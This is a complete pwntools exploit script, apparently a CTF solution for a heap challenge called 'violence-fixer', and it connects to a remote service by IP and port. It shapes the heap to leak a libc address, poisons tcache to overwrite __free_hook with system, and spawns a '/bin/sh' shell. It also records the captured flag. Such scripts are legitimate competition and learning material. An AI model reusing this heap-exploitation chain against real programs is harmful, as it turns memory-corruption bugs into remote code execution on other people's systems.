from pwn import *


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def alloc(size, content):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', b'%d' % size)
    io.sendlineafter(b'content: ', content)
    io.recvuntil(b'1: ')


@debug
def show(index):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index: ', b'%d' % index)
    data = io.recvline()
    io.recvuntil(b'1: ')
    return data.rstrip()


@debug
def free(index):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index: ', b'%d' % index)
    io.recvuntil(b'1: ')


@debug
def delegate(size, content):
    io.sendlineafter(b'> ', b'0')
    io.sendlineafter(b'???> ', b'y')
    io.sendlineafter(b'size: ', b'%d' % size)
    io.sendlineafter(b'content: ', content)
    io.recvuntil(b'1: ')


binpath = './violence-fixer'
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
b _alloc
b _show
b _free
b _assumption
b delegate
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('35.221.81.216', 32112)

io.sendlineafter(b'?: ', b'y')

alloc(0x18, b'A')  # 0
alloc(0x200, b'B')  # 1
alloc(0x200, b'C')  # 2
alloc(0x200, b'D')  # 3
alloc(0x200, b'E')  # 4
alloc(0x38, b'F')  # 5
alloc(0x38, b'G')  # 6

free(6)
free(5)
free(2)
free(1)
free(0)

payload = b''
payload += p64(0) * 2  # pad
payload += p64(0xdeadbeef)  # chunk_D->prev_size
payload += p64(0x420 | 1)  # chunk_D->size
alloc(0x28, payload)  # 0
free(3)  # free chunk_D

# by splitting up unsorted bin
# move addr_main_arena into chunk_E
alloc(0x108, b'H')  # 1
alloc(0xf8, b'a')  # 2

addr_libc = u64(show(4).ljust(8, b'\x00')) - 0x1ebbe0
print('addr_libc = 0x{:x}'.format(addr_libc))

# move fake top to chunk_F
alloc(0x108, b'I')
alloc(0xf8, b'J')
alloc(0xf8, b'K')
alloc(0xe8, b'L')

payload = b''
payload += p64(0xdeadbeef)  # chunk_F->prev_size
payload += p64(0x40 | 1)  # chunk_F->size
payload += p64(addr_libc + libc.symbols['__free_hook'])  # chunk_F->next
payload += p64(0xdeadbeefcafebabe)  # chunkF->key
alloc(0x48, payload)

free(2)

alloc(0x38, b'/bin/sh\x00')  # 2
delegate(0x38, p64(addr_libc + libc.symbols['system']))

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b'index: ', b'2')


io.interactive()


# TSG{dont_eat_your_pet_fish}
